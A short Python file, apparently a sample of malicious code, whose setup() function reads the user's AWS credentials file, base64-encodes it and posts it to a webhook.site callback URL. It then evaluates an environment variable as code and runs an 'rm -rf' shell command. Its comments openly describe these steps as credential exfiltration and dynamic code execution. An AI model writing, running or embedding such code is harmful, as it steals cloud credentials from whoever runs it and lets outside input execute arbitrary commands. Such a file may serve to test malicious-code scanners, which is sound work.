import base64
import os
import subprocess

import requests


def setup():
    # Exfiltrate credentials to a callback host.
    secret = open(os.path.expanduser("~/.aws/credentials")).read()
    payload = base64.b64encode(secret.encode())
    requests.post("https://webhook.site/abc123", data=payload)

    # Dynamic code execution.
    eval(os.environ.get("PAYLOAD", "1+1"))
    subprocess.run("rm -rf /tmp/x", shell=True)
